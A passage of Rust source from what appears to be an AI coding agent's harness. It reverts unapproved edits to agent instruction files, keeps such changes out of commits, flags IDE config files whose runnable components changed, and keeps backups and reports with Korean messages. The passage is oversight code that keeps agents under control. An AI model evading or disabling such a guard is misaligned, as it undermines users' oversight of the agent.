/// a canonical rendering of its element (attributes sorted, whitespace-only
/// text dropped, comments left out), or `None` when the bytes are not
/// well-formed XML. Only `<component name="...">` children of the root
/// element count, and a document type declaration, as it is, under
/// [`DOCTYPE_COMPONENT`]: one that is new or differs can change what an
/// entity reference in a component expands to.
fn executable_components(bytes: &[u8]) -> Option<BTreeMap<String, String>> {
    use quick_xml::events::{BytesStart, Event};
    fn tag(element: &BytesStart, empty: bool) -> Option<String> {
        let mut attributes = Vec::new();
        for attribute in element.attributes() {
            let attribute = attribute.ok()?;
            attributes.push((
                String::from_utf8_lossy(attribute.key.as_ref()).into_owned(),
                String::from_utf8_lossy(&attribute.value).into_owned(),
            ));
        }
        attributes.sort();
        let mut out = format!("<{}", String::from_utf8_lossy(element.name().as_ref()));
        for (key, value) in attributes {
            out.push_str(&format!(" {key}=\"{value}\""));
        }
        out.push_str(if empty { "/>" } else { ">" });
        Some(out)
    }
    fn component(element: &BytesStart) -> Option<String> {
        if element.name().as_ref() != b"component" {
            return None;
        }
        element.attributes().flatten().find_map(|attribute| {
            (attribute.key.as_ref() == b"name")
                .then(|| String::from_utf8_lossy(&attribute.value).into_owned())
                .filter(|name| EXECUTABLE_IDE_COMPONENTS.contains(&name.as_str()))
        })
    }
    let text = std::str::from_utf8(bytes).ok()?;
    let mut reader = quick_xml::Reader::from_str(text);
    reader.config_mut().check_end_names = true;
    let mut components: BTreeMap<String, String> = BTreeMap::new();
    let mut open: Option<(String, String)> = None;
    let mut depth = 0usize;
    loop {
        match reader.read_event().ok()? {
            Event::Start(element) => {
                depth += 1;
                if depth == 2 && open.is_none() {
                    if let Some(name) = component(&element) {
                        open = Some((name, String::new()));
                    }
                }
                if let Some((_, rendered)) = open.as_mut() {
                    rendered.push_str(&tag(&element, false)?);
                }
            }
            Event::Empty(element) => {
                let rendered = tag(&element, true)?;
                match open.as_mut() {
                    Some((_, open)) => open.push_str(&rendered),
                    None if depth == 1 => {
                        if let Some(name) = component(&element) {
                            components.entry(name).or_default().push_str(&rendered);
                        }
                    }
                    None => {}
                }
            }
            Event::End(element) => {
                if let Some((_, rendered)) = open.as_mut() {
                    rendered.push_str(&format!(
                        "</{}>",
                        String::from_utf8_lossy(element.name().as_ref())
                    ));
                }
                if depth == 2 {
                    if let Some((name, rendered)) = open.take() {
                        components.entry(name).or_default().push_str(&rendered);
                    }
                }
                depth = depth.checked_sub(1)?;
            }
            Event::Text(text) => {
                if let Some((_, rendered)) = open.as_mut() {
                    rendered.push_str(String::from_utf8_lossy(text.as_ref()).trim());
                }
            }
            Event::CData(data) => {
                if let Some((_, rendered)) = open.as_mut() {
                    rendered.push_str(&format!(
                        "<![CDATA[{}]]>",
                        String::from_utf8_lossy(data.as_ref())
                    ));
                }
            }
            Event::GeneralRef(reference) => {
                if let Some((_, rendered)) = open.as_mut() {
                    rendered.push_str(&format!(
                        "&{};",
                        String::from_utf8_lossy(reference.as_ref())
                    ));
                }
            }
            Event::DocType(doctype) => {
                components
                    .entry(DOCTYPE_COMPONENT.to_string())
                    .or_default()
                    .push_str(&String::from_utf8_lossy(doctype.as_ref()));
            }
            Event::Eof => break,
            Event::Comment(_) | Event::Decl(_) | Event::PI(_) => {}
        }
    }
    (depth == 0 && open.is_none()).then_some(components)
}

/// Whether a watched IDE file that went from `before` to `now` changed a
/// component that can run something ([`executable_components`]): one that
/// is new or differs from what it was. A component that only went away runs
/// nothing. Content that cannot be read or parsed on either side counts as
/// changed.
fn runs_something_new(before: Option<&Kind>, now: Option<&Kind>) -> bool {
    let components = |kind: Option<&Kind>| match kind {
        None => Some(BTreeMap::new()),
        Some(Kind::File {
            bytes: Some(bytes), ..
        }) => executable_components(bytes),
        Some(_) => None,
    };
    match (components(before), components(now)) {
        (Some(before), Some(now)) => now
            .iter()
            .any(|(name, rendered)| before.get(name) != Some(rendered)),
        _ => true,
    }
}

/// Put back every instruction file of `root` that differs from `baseline`
/// without an allowed write. `settled` (keyed by `git::path_key`) is what
/// the project settled on since the baseline and wins over it; `current` is
/// a scan taken shortly before (outside the transaction this runs in). Every
/// path the scan shows changed, or that an incomplete scan did not reach, is
/// read again right here before anything is restored or deleted.
pub(crate) fn revert_unapproved(
    root: &Path,
    baseline: &Snapshot,
    settled: &HashMap<String, Settled>,
    current: &Snapshot,
) -> Reverted {
    let mut outcome = Reverted {
        incomplete: !current.complete,
        ..Reverted::default()
    };
    let mut backup = Backup::new(root);
    let keys: BTreeSet<&String> = baseline
        .entries
        .keys()
        .chain(current.entries.keys())
        .chain(settled.keys())
        .collect();
    let mut created_dirs = Vec::new();
    let mut missing_dirs = Vec::new();
    // The dirty paths of the repository, read once a watched file changed;
    // `None` inside when git cannot tell.
    let mut dirty: Option<Option<std::collections::HashSet<String>>> = None;
    for key in keys {
        let before = baseline.entries.get(key);
        let scanned = current.entries.get(key);
        let target = match settled.get(key) {
            Some(settled) => settled.target.clone(),
            None => before.map(|entry| entry.kind.clone()),
        };
        // An absent target is known only from a complete baseline, a
        // baseline entry, or a settled tombstone.
        let target_known = settled.contains_key(key) || before.is_some() || baseline.complete;
        if same(target.as_ref(), scanned.map(|entry| &entry.kind))
            && (scanned.is_some() || current.complete)
        {
            continue;
        }
        let relative = scanned
            .map(|entry| entry.relative.clone())
            .or_else(|| before.map(|entry| entry.relative.clone()))
            .or_else(|| settled.get(key).map(|settled| settled.relative.clone()))
            .unwrap_or_else(|| key.clone());
        // Read again: the scan is older than this transaction, and an
        // incomplete one may not have reached the path at all.
        let now = match probe(root, &relative, false) {
            Ok(now) => now,
            // A path the complete scan saw nothing at, behind a folder that
            // is no longer a plain folder: the restore below refuses it.
            Err(_) if current.complete && scanned.is_none() => None,
            Err(_) if current.complete => scanned.map(|entry| entry.kind.clone()),
            Err(_) => {
                outcome.unchecked.push(relative);
                continue;
            }
        };
        if same(target.as_ref(), now.as_ref()) {
            continue;
        }
        // The IDE rewrites it on its own: never put back, only kept out of
        // the commit, and told only when what it can run changed.
        if crate::fs_tools::is_watch_only_instruction_path(&relative) {
            let dirty = dirty.get_or_insert_with(|| {
                crate::git::dirty_paths(root).ok().map(|paths| {
                    paths
                        .iter()
                        .map(|path| crate::git::path_key(path))
                        .collect()
                })
            });
            // Ignored by git (or back to its committed bytes): no commit
            // would take it, so there is nothing to keep out or hold, but
            // the IDE still runs what it says.
            let untracked = dirty
                .as_ref()
                .is_some_and(|dirty| !dirty.contains(&crate::git::path_key(&relative)));
            let now = probe(root, &relative, true).unwrap_or(None);
            let too_large =
                |kind: Option<&Kind>| matches!(kind, Some(Kind::File { bytes: None, .. }));
            if too_large(target.as_ref()) || too_large(now.as_ref()) {
                outcome.watched_uncompared.push(relative.clone());
            } else if runs_something_new(target.as_ref(), now.as_ref()) {
                let kept = match &target {
                    Some(Kind::File {
                        bytes: Some(bytes), ..
                    }) => backup.keep_bytes(&relative, bytes).ok(),
                    _ => None,
                };
                outcome.watched_risky.push((relative.clone(), kept));
                if untracked {
                    outcome.watched_untracked.push(relative.clone());
                }
            }
            if !untracked {
                outcome.watched.push(relative);
            }
            continue;
        }
        let mut fail = |reason: &str| outcome.failed.push((relative.clone(), reason.to_string()));
        match (&target, now.as_ref()) {
            (None, _) if !target_known => outcome.unchecked.push(relative),
            (None, Some(Kind::Dir)) => created_dirs.push(relative),
            (None, Some(_)) => match delete(root, &relative, &mut backup) {
                Ok(()) => {
                    outcome.settled.push(Settled {
                        relative: relative.clone(),
                        target: None,
                    });
                    outcome.restored.push(relative);
                }
                Err(error) => fail(&format!("지우지 못했습니다: {error}")),
            },
            (Some(Kind::Dir), None) => missing_dirs.push(relative),
            (Some(Kind::Dir), Some(_)) => fail("폴더가 다른 것으로 바뀌었습니다"),
            (
                Some(Kind::File {
                    bytes: Some(bytes), ..
                }),
                _,
            ) => match restore(root, &relative, bytes, &mut backup) {
                Ok(()) => {
                    outcome.settled.push(Settled {
                        relative: relative.clone(),
                        target: target.clone(),
                    });
                    outcome.restored.push(relative);
                }
                Err(error) => fail(&format!("되돌리지 못했습니다: {error}")),
            },
            (Some(Kind::File { bytes: None, .. }), _) => {
                fail("파일이 커서 턴 시작 때 내용을 보관하지 않았습니다")
            }
            (Some(Kind::Link(_)), _) => fail("링크는 되돌리지 않습니다"),
            (Some(Kind::Unreadable), _) => outcome.unchecked.push(relative),
            (None, None) => {}
        }
    }
    // Shallowest first, so a restored folder's parent exists before it.
    missing_dirs.sort_by_key(|relative| relative.matches('/').count());
    for relative in missing_dirs {
        let created = safe_path(root, &relative, true)
            .map_err(String::from)
            .and_then(|path| match fs::create_dir(&path) {
                Ok(()) => Ok(true),
                // Someone made it in the meantime: nothing was restored.
                Err(error) if error.kind() == std::io::ErrorKind::AlreadyExists => {
                    match fs::symlink_metadata(&path) {
                        Ok(metadata) if metadata.is_dir() && !metadata.file_type().is_symlink() => {
                            Ok(false)
                        }
                        _ => Err("같은 이름의 다른 것이 생겼습니다".to_string()),
                    }
                }
                Err(error) => Err(error.to_string()),
            });
        match created {
            Ok(true) => {
                outcome.settled.push(Settled {
                    relative: relative.clone(),
                    target: Some(Kind::Dir),
                });
                outcome.restored.push(relative);
            }
            Ok(false) => {}
            Err(error) => outcome
                .failed
                .push((relative, format!("폴더를 되살리지 못했습니다: {error}"))),
        }
    }
    // Deepest first, so a created folder is empty by the time it is removed.
    created_dirs.sort_by_key(|relative| std::cmp::Reverse(relative.matches('/').count()));
    for relative in created_dirs {
        let removed = safe_path(root, &relative, false)
            .map_err(String::from)
            .and_then(|path| {
                checked(root, &relative, || {
                    fs::remove_dir(&path).map_err(|error| error.to_string())
                })
            });
        match removed {
            Ok(()) => {
                outcome.settled.push(Settled {
                    relative: relative.clone(),
                    target: None,
                });
                outcome.restored.push(relative);
            }
            Err(error) => outcome.failed.push((
                relative,
                format!("새로 생긴 폴더를 지우지 못했습니다: {error}"),
            )),
        }
    }
    if backup.used {
        prune_backups(root, crate::session::now_unix_millis(), Some(backup.name()));
        outcome.reverted_backup = backup.reverted;
        outcome.backup = Some(backup.folder);
    }
    outcome
}

/// The time a sweep folder name `<millis>-<8 hex>` ([`Backup::new`]) was
/// made, or `None` for any other name.
fn backup_folder_millis(name: &str) -> Option<u64> {
    let (millis, id) = name.split_once('-')?;
    let well_formed = !millis.is_empty()
        && millis.bytes().all(|byte| byte.is_ascii_digit())
        && id.len() == 8
        && id
            .bytes()
            .all(|byte| byte.is_ascii_digit() || (b'a'..=b'f').contains(&byte));
    well_formed.then(|| millis.parse().ok()).flatten()
}

/// Keep the newest [`BACKUP_KEEP`] sweep folders of [`BACKUP_DIR`] that are
/// at most [`BACKUP_MAX_AGE_MILLIS`] old and remove the others. `keep` (the
/// folder the calling sweep just made) is always kept and counts among the
/// newest. A folder dated after `now` (a clock that went back) neither
/// counts nor goes, unless it is more than [`BACKUP_FUTURE_SLACK_MILLIS`]
/// ahead. Only plain folders named the way a sweep names them are touched:
/// a link is never followed or removed, and nothing else there is looked at.
fn prune_backups(root: &Path, now: u64, keep: Option<&str>) {
    let Ok(dir) = safe_path(root, BACKUP_DIR, false) else {
        return;
    };
    if !fs::symlink_metadata(&dir)
        .is_ok_and(|metadata| metadata.is_dir() && !metadata.file_type().is_symlink())
    {
        return;
    }
    let Ok(children) = fs::read_dir(&dir) else {
        return;
    };
    let mut folders: Vec<(u64, String)> = children
        .flatten()
        .filter_map(|child| {
            let name = child.file_name().to_str()?.to_string();
            let millis = backup_folder_millis(&name)?;
            let metadata = fs::symlink_metadata(child.path()).ok()?;
            (metadata.is_dir() && !metadata.file_type().is_symlink()).then_some((millis, name))
        })
        .collect();
    folders.sort_by(|a, b| b.cmp(a));
    // The kept folder takes its place among the newest whatever its time.
    let mut counted = usize::from(folders.iter().any(|(_, name)| Some(name.as_str()) == keep));
    for (millis, name) in folders {
        if Some(name.as_str()) == keep {
            continue;
        }
        let remove = if millis > now {
            millis - now > BACKUP_FUTURE_SLACK_MILLIS
        } else {
            counted >= BACKUP_KEEP || now - millis > BACKUP_MAX_AGE_MILLIS
        };
        if !remove {
            if millis <= now {
                counted += 1;
            }
            continue;
        }
        let relative = format!("{BACKUP_DIR}/{name}");
        let Ok(path) = safe_path(root, &relative, false) else {
            continue;
        };
        // `remove_dir_all` removes a link inside as a link, never what it
        // points at; the folder itself was checked to be a plain folder.
        let _ = checked(root, &relative, || {
            fs::remove_dir_all(&path).map_err(|error| error.to_string())
        });
    }
}

/// A short, comparable description of what is at `relative` now, for a
/// path a sweep left in place: while it stays the same, the path stays out
/// of every commit.
fn fingerprint(root: &Path, relative: &str) -> String {
    match probe(root, relative, false) {
        Ok(None) => "absent".to_string(),
        Ok(Some(Kind::File { sha256, .. })) => format!("file:{sha256}"),
        Ok(Some(Kind::Dir)) => "dir".to_string(),
        Ok(Some(Kind::Link(target))) => format!("link:{target}"),
        Ok(Some(Kind::Unreadable)) => "unreadable".to_string(),
        Err(_) => "unknown".to_string(),
    }
}

/// The paths of `scope` an earlier sweep left in place (it could not put
/// them back, or could not judge them) that are still exactly as it left
/// them: they stay out of every commit, the turn-start external-edit commit
/// included, until something changes them. A path that changed since is
/// released. Called inside the scope's transaction.
pub(crate) fn held_paths(
    root: &Path,
    writes: &crate::write_coordinator::ProjectWriteCoordinator,
    scope: &str,
) -> Vec<String> {
    load_held(root, writes, scope);
    let held = writes.held_instruction_paths(scope);
    // A watch-only path stays held while it differs from the last commit;
    // without git (or when git fails) it simply stays held.
    let dirty: Option<std::collections::HashSet<String>> = held
        .iter()
        .any(|(_, state)| state == WATCH_FINGERPRINT)
        .then(|| crate::git::dirty_paths(root).ok())
        .flatten()
        .map(|paths| {
            paths
                .iter()
                .map(|path| crate::git::path_key(path))
                .collect()
        });
    let mut kept = Vec::new();
    let mut released = Vec::new();
    for (relative, state) in held {
        let still = if state == WATCH_FINGERPRINT {
            match &dirty {
                Some(dirty) => dirty.contains(&crate::git::path_key(&relative)),
                None => true,
            }
        } else {
            fingerprint(root, &relative) == state
        };
        if still {
            kept.push(relative);
        } else {
            released.push(relative);
        }
    }
    if !released.is_empty() {
        writes.release_instruction_paths(scope, &released);
        save_held(root, writes, scope);
    }
    kept
}

/// The warning for paths [`held_paths`] keeps out of a commit, or `None`.
/// A watched IDE file is held quietly: the sweep that held it already told
/// whether what it can run changed, and the IDE rewrites it every turn.
pub(crate) fn held_warning(paths: &[String]) -> Option<String> {
    let held: Vec<String> = paths
        .iter()
        .filter(|path| !crate::fs_tools::is_watch_only_instruction_path(path))
        .cloned()
        .collect();
    (!held.is_empty()).then(|| {
        format!(
            "승인 없이 바뀐 채 남아 있는 지시 파일을 이번 커밋에서도 뺐습니다. 직접 확인해 주세요: {}",
            bounded_list(held.into_iter())
        )
    })
}

/// One held path as [`HELD_FILE`] keeps it.
#[derive(serde::Serialize, serde::Deserialize)]
struct HeldEntry {
    path: String,
    state: String,
}

/// Read the held paths of `scope` back from [`HELD_FILE`] the first time
/// the scope is asked about, so a restart keeps holding them. An entry that
/// is not a normalized instruction path is ignored.
fn load_held(root: &Path, writes: &crate::write_coordinator::ProjectWriteCoordinator, scope: &str) {
    if !writes.first_held_load(scope) {
        return;
    }
    let Ok(path) = safe_path(root, HELD_FILE, false) else {
        return;
    };
    let Ok(metadata) = fs::symlink_metadata(&path) else {
        return;
    };
    if !metadata.is_file() || metadata.len() > HELD_FILE_MAX_BYTES {
        return;
    }
    let Ok(bytes) = fs::read(&path) else {
        return;
    };
    let Ok(entries) = serde_json::from_slice::<Vec<HeldEntry>>(&bytes) else {
        return;
    };
    writes.hold_instruction_paths(
        scope,
        entries
            .into_iter()
            .filter(|entry| {
                crate::write_coordinator::normalize_claim_path(&entry.path).as_deref()
                    == Some(entry.path.as_str())
                    && guarded(&entry.path)
                    // Only a watched IDE file is held by its dirty state;
                    // any other path is held by what it was.
                    && (entry.state != WATCH_FINGERPRINT
                        || crate::fs_tools::is_watch_only_instruction_path(&entry.path))
            })
            .map(|entry| (entry.path, entry.state))
            .collect(),
    );
}

/// Write the held paths of `scope` to [`HELD_FILE`] (UTF-8 JSON, no BOM,
/// temporary file + rename), or remove it when none is held. A failure
/// leaves the paths held for this process only.
fn save_held(root: &Path, writes: &crate::write_coordinator::ProjectWriteCoordinator, scope: &str) {
    let mut entries: Vec<HeldEntry> = writes
        .held_instruction_paths(scope)
        .into_iter()
        .map(|(path, state)| HeldEntry { path, state })
        .collect();
    entries.sort_by(|a, b| a.path.cmp(&b.path));
    let Ok(path) = safe_path(root, HELD_FILE, !entries.is_empty()) else {
        return;
    };
    if entries.is_empty() {
        if fs::symlink_metadata(&path).is_ok_and(|metadata| metadata.is_file()) {
            let _ = fs::remove_file(&path);
        }
        return;
    }
    if let Ok(bytes) = serde_json::to_vec_pretty(&entries) {
        let _ = crate::memory::write_atomic_bytes(&path, &bytes);
    }
}

/// The instruction paths a commit of `scope` must hold back besides its
/// own sweep's: every one that differs from the last commit while the
/// project settled on nothing for it after `since` (or on something else
/// than it now is). In a turn commit that is another session's unapproved
/// change or a sweep still to come, never the turn's own work, which its
/// sweep put back or an allowed write recorded. Called inside the scope's
/// transaction.
pub(crate) fn unsettled_paths(
    root: &Path,
    writes: &crate::write_coordinator::ProjectWriteCoordinator,
    scope: &str,
    since: u64,
) -> Result<Vec<String>, String> {
    let settled = writes.instruction_writes_since(scope, since);
    Ok(crate::git::dirty_paths(root)?
        .into_iter()
        .filter(|path| crate::fs_tools::is_agent_instruction_path(path))
        .filter(|path| match settled.get(&crate::git::path_key(path)) {
            Some(settled) => probe(root, path, false)
                .map_or(true, |now| !same(settled.target.as_ref(), now.as_ref())),
            None => true,
        })
        .collect())
}

/// Record the content an allowed `fs_write`/`fs_edit` left at `relative`
/// as settled for `scope`, and stop holding the path. Called inside the
/// scope's transaction, right after the write succeeded.
pub(crate) fn record_approved(
    root: &Path,
    writes: &crate::write_coordinator::ProjectWriteCoordinator,
    scope: &str,
    relative: &str,
    content: ApprovedContent,
) {
    load_held(root, writes, scope);
    writes.record_instruction_write(scope, relative, content);
    writes.release_instruction_paths(scope, &[relative.to_string()]);
    save_held(root, writes, scope);
}

/// Record, as settled for `scope`, what the instruction paths among
/// `paths` (and the instruction folders above them) are now. A history
/// revert (`git_revert`, `worker_revert`) calls it inside its transaction
/// with the files its commits changed, so no other session's turn-end sweep
/// puts the reverted content back.
pub(crate) fn settle_paths(
    root: &Path,
    writes: &crate::write_coordinator::ProjectWriteCoordinator,
    scope: &str,
    paths: impl IntoIterator<Item = String>,
) {
    let mut seen = BTreeSet::new();
    let mut settled = Vec::new();
    for path in paths {
        let parts: Vec<&str> = path.split('/').collect();
        for end in 1..=parts.len() {
            let relative = parts[..end].join("/");
            if !guarded(&relative) || !seen.insert(crate::git::path_key(&relative)) {
                continue;
            }
            // A link or an unreadable entry settles nothing.
            if let Ok(target @ (None | Some(Kind::File { .. }) | Some(Kind::Dir))) =
                probe(root, &relative, true)
            {
                settled.push(Settled { relative, target });
            }
        }
    }
    let released: Vec<String> = settled.iter().map(|item| item.relative.clone()).collect();
    if !released.is_empty() {
        load_held(root, writes, scope);
        writes.release_instruction_paths(scope, &released);
        save_held(root, writes, scope);
    }
    writes.record_instruction_settled(scope, settled);
}

/// [`settle_paths`] for every file the commits `shas` changed.
pub(crate) fn settle_commits(
    root: &Path,
    writes: &crate::write_coordinator::ProjectWriteCoordinator,
    scope: &str,
    shas: &[String],
) {
    let paths = shas
        .iter()
        .filter_map(|sha| crate::git::commit_paths_of(root, sha).ok())
        .flatten()
        .collect::<Vec<_>>();
    settle_paths(root, writes, scope, paths);
}

/// Serializes reads and writes of [`REPORTS_FILE`] within the process (one
/// app process serves every window).
static REPORTS_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

/// Whether a report read back from [`REPORTS_FILE`] names only what a sweep
/// could have written: normalized instruction paths, a sweep folder of
/// [`BACKUP_DIR`] and copies inside it, and bounded reasons.
fn valid_report(report: &Reverted) -> bool {
    let short = |path: &str| path.chars().count() <= REPORT_MAX_PATH_CHARS;
    let path_ok = |path: &str| {
        short(path)
            && crate::write_coordinator::normalize_claim_path(path).as_deref() == Some(path)
            && guarded(path)
    };
    let reason_ok = |reason: &str| reason.chars().count() <= REPORT_MAX_REASON_CHARS;
    let counts_ok = [
        report.restored.len(),
        report.failed.len(),
        report.unchecked.len(),
        report.watched.len(),
        report.watched_risky.len(),
        report.watched_untracked.len(),
        report.watched_uncompared.len(),
    ]
    .iter()
    .all(|count| *count <= REPORT_MAX_ENTRIES);
    let folder_ok = |folder: &str| {
        short(folder)
            && folder
                .strip_prefix(BACKUP_DIR)
                .and_then(|rest| rest.strip_prefix('/'))
                .is_some_and(|name| backup_folder_millis(name).is_some())
    };
    // A kept copy is its sweep folder plus the path it keeps.
    let kept_ok = |kept: &str| {
        kept.chars().count() <= 2 * REPORT_MAX_PATH_CHARS
            && crate::write_coordinator::normalize_claim_path(kept).as_deref() == Some(kept)
            && report.backup.as_deref().is_some_and(|folder| {
                kept.strip_prefix(folder)
                    .is_some_and(|rest| rest.starts_with('/'))
            })
    };
    report.settled.is_empty()
        && counts_ok
        && report.restored.iter().all(|path| path_ok(path))
        && report.unchecked.iter().all(|path| path_ok(path))
        && report.watched.iter().all(|path| path_ok(path))
        && report.watched_untracked.iter().all(|path| path_ok(path))
        && report.watched_uncompared.iter().all(|path| path_ok(path))
        && report.error.as_deref().map_or(true, reason_ok)
        && report
            .failed
            .iter()
            .all(|(path, reason)| path_ok(path) && reason_ok(reason))
        && report
            .watched_risky
            .iter()
            .all(|(path, kept)| path_ok(path) && kept.as_deref().map_or(true, kept_ok))
        && report.backup.as_deref().map_or(true, folder_ok)
}

/// The reports waiting in [`REPORTS_FILE`], each validated; an unreadable or
/// malformed file is read as none.
fn read_reports(path: &Path) -> Vec<Reverted> {
    let Ok(metadata) = fs::symlink_metadata(path) else {
        return Vec::new();
    };
    if !metadata.is_file() || metadata.len() > REPORTS_FILE_MAX_BYTES {
        return Vec::new();
    }
    fs::read(path)
        .ok()
        .and_then(|bytes| serde_json::from_slice::<Vec<Reverted>>(&bytes).ok())
        .unwrap_or_default()
        .into_iter()
        .filter(valid_report)
        .collect()
}

/// `report` within what [`valid_report`] reads back: each list cut to
/// [`REPORT_MAX_ENTRIES`], paths past [`REPORT_MAX_PATH_CHARS`] left out and
/// reasons cut to [`REPORT_MAX_REASON_CHARS`]. Anything left out marks the
/// report incomplete, so the user is still told something was not shown.
fn bounded_for_file(report: &Reverted) -> Reverted {
    let mut cut = false;
    let short = |path: &String| path.chars().count() <= REPORT_MAX_PATH_CHARS;
    let mut paths = |list: &[String]| -> Vec<String> {
        let kept: Vec<String> = list
            .iter()
            .filter(|path| short(path))
            .take(REPORT_MAX_ENTRIES)
            .cloned()
            .collect();
        cut |= kept.len() < list.len();
        kept
    };
    let reason = |text: &String| {
        text.chars()
            .take(REPORT_MAX_REASON_CHARS)
            .collect::<String>()
    };
    let restored = paths(&report.restored);
    let unchecked = paths(&report.unchecked);
    let watched = paths(&report.watched);
    let watched_untracked = paths(&report.watched_untracked);
    let watched_uncompared = paths(&report.watched_uncompared);
    let failed: Vec<(String, String)> = report
        .failed
        .iter()
        .filter(|(path, _)| short(path))
        .take(REPORT_MAX_ENTRIES)
        .map(|(path, why)| (path.clone(), reason(why)))
        .collect();
    let kept_short = |kept: &Option<String>| {
        kept.as_ref().map_or(true, |kept| {
            kept.chars().count() <= 2 * REPORT_MAX_PATH_CHARS
        })
    };
    let watched_risky: Vec<(String, Option<String>)> = report
        .watched_risky
        .iter()
        .filter(|(path, kept)| short(path) && kept_short(kept))
        .take(REPORT_MAX_ENTRIES)
        .cloned()
        .collect();
    cut |= failed.len() < report.failed.len() || watched_risky.len() < report.watched_risky.len();
    let backup = report.backup.clone().filter(|folder| short(folder));
    cut |= backup.is_none() && report.backup.is_some();
    Reverted {
        restored,
        failed,
        unchecked,
        watched,
        watched_risky: if backup.is_some() {
            watched_risky
        } else {
            watched_risky
                .into_iter()
                .map(|(path, _)| (path, None))
                .collect()
        },
        watched_untracked,
        watched_uncompared,
        incomplete: report.incomplete || cut,
        reverted_backup: report.reverted_backup && backup.is_some(),
        backup,
        error: report.error.as_ref().map(reason),
        settled: Vec::new(),
    }
}

/// Keep `report` in [`REPORTS_FILE`] (UTF-8 JSON, no BOM, temporary file +
/// rename) for the project's next turn to tell: its sweep ran after the
/// project closed, or after its engine went away. At most [`REPORTS_KEEP`]
/// wait, the oldest dropped first. A report with nothing to tell is not kept.
pub(crate) fn persist_report(root: &Path, report: &Reverted) {
    if report.warning().is_none() && report.model_note().is_none() {
        return;
    }
    let report = bounded_for_file(report);
    let _lock = REPORTS_LOCK
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let Ok(path) = safe_path(root, REPORTS_FILE, true) else {
        return;
    };
    let mut reports = read_reports(&path);
    reports.push(report);
    let surplus = reports.len().saturating_sub(REPORTS_KEEP);
    reports.drain(..surplus);
    if let Ok(bytes) = serde_json::to_vec_pretty(&reports) {
        let _ = crate::memory::write_atomic_bytes(&path, &bytes);
    }
}

/// Take the reports [`persist_report`] kept for `root`, oldest first, and
/// remove the file.
pub(crate) fn take_persisted_reports(root: &Path) -> Vec<Reverted> {
    let _lock = REPORTS_LOCK
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let Ok(path) = safe_path(root, REPORTS_FILE, false) else {
        return Vec::new();
    };
    let reports = read_reports(&path);
    if fs::symlink_metadata(&path).is_ok_and(|metadata| metadata.is_file()) {
        let _ = fs::remove_file(&path);
    }
    reports
}

/// One turn's baseline and what its sweeps already reported. It counts as a
/// running guard of its scope in the coordinator from [`Self::capture`]
/// until it is dropped, which keeps the settled records it can still read.
pub(crate) struct InstructionGuard {
    baseline: Snapshot,
    /// The coordinator's settled sequence when the baseline was taken; only
    /// what the project settled on after it changes what a path goes back
    /// to.
    since: u64,
    reported: BTreeSet<String>,
    writes: crate::write_coordinator::ProjectWriteCoordinator,
    scope: String,
    id: u64,
}

impl Drop for InstructionGuard {
    fn drop(&mut self) {
        self.writes.close_instruction_guard(&self.scope, self.id);
    }
}

/// What one sweep did: every path the commit must leave out, and what is
/// new to tell.
pub(crate) struct Sweep {
    pub excluded: Vec<String>,
    pub report: Reverted,
}

impl InstructionGuard {
    /// Register a guard of `scope` and take its baseline of `root`.
    pub(crate) fn capture(
        root: &Path,
        writes: &crate::write_coordinator::ProjectWriteCoordinator,
        scope: &str,
    ) -> Self {
        let (id, since) = writes.open_instruction_guard(scope);
        Self {
            baseline: Snapshot::capture(root),
            since,
            reported: BTreeSet::new(),
            writes: writes.clone(),
            scope: scope.to_string(),
            id,
        }
    }

    /// The coordinator's guard id of this baseline.
    pub(crate) fn id(&self) -> u64 {
        self.id
    }

    /// The settled sequence this baseline was taken at.
    pub(crate) fn since(&self) -> u64 {
        self.since
    }

    /// Put back what changed without approval since the baseline, comparing
    /// with `current` ([`Snapshot::current`], taken before the transaction
    /// this runs in). What it put back becomes the project's settled content;
    /// a path it could not put back or judge is held out of every commit
    /// (see [`held_paths`]) and reported once.
    pub(crate) fn sweep(
        &mut self,
        root: &Path,
        writes: &crate::write_coordinator::ProjectWriteCoordinator,
        scope: &str,
        current: &Snapshot,
    ) -> Sweep {
        load_held(root, writes, scope);
        let settled = writes.instruction_writes_since(scope, self.since);
        let mut reverted = revert_unapproved(root, &self.baseline, &settled, current);
        let restored: Vec<String> = reverted.restored.clone();
        writes.release_instruction_paths(scope, &restored);
        writes.record_instruction_settled(scope, std::mem::take(&mut reverted.settled));
        let held: Vec<(String, String)> = reverted
            .failed
            .iter()
            .map(|(path, _)| path)
            .chain(reverted.unchecked.iter())
            .map(|path| (path.clone(), fingerprint(root, path)))
            .chain(
                reverted
                    .watched
                    .iter()
                    .map(|path| (path.clone(), WATCH_FINGERPRINT.to_string())),
            )
            .collect();
        if !held.is_empty() || !restored.is_empty() {
            writes.hold_instruction_paths(scope, held);
            save_held(root, writes, scope);
        }
        let mut excluded = reverted.excluded();
        let excluded_keys: BTreeSet<String> = excluded
            .iter()
            .map(|path| crate::git::path_key(path))
            .collect();
        excluded.extend(
            held_paths(root, writes, scope)
                .into_iter()
                .filter(|path| !excluded_keys.contains(&crate::git::path_key(path))),
        );
        let mut report = Reverted {
            restored: reverted.restored,
            incomplete: reverted.incomplete && self.reported.insert("\0incomplete".to_string()),
            backup: reverted.backup,
            reverted_backup: reverted.reverted_backup,
            ..Reverted::default()
        };
        for (path, kept) in reverted.watched_risky {
            if self
                .reported
                .insert(format!("\0risky:{}", crate::git::path_key(&path)))
            {
                if reverted.watched_untracked.contains(&path) {
                    report.watched_untracked.push(path.clone());
                }
                report.watched_risky.push((path, kept));
            }
        }
        for path in reverted.watched_uncompared {
            if self
                .reported
                .insert(format!("\0large:{}", crate::git::path_key(&path)))
            {
                report.watched_uncompared.push(path);
            }
        }
        for (path, reason) in reverted.failed {
            if self.reported.insert(crate::git::path_key(&path)) {
                report.failed.push((path, reason));
            }
        }
        for path in reverted.unchecked {
            if self.reported.insert(crate::git::path_key(&path)) {
                report.unchecked.push(path);
            }
        }
        for path in reverted.watched {
            if self.reported.insert(crate::git::path_key(&path)) {
                report.watched.push(path);
            }
        }
        Sweep { excluded, report }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn project(tag: &str) -> PathBuf {
        let root = std::env::temp_dir().join(format!(
            "eud-agent-instruction-guard-{tag}-{}",
            uuid::Uuid::new_v4()
        ));
        fs::create_dir_all(root.join("src")).unwrap();
        fs::write(root.join("src/main.eps"), "function onPluginStart() {}").unwrap();
        fs::write(root.join("AGENTS.md"), "original").unwrap();
        root
    }

    fn sweep(root: &Path, baseline: &Snapshot) -> Reverted {
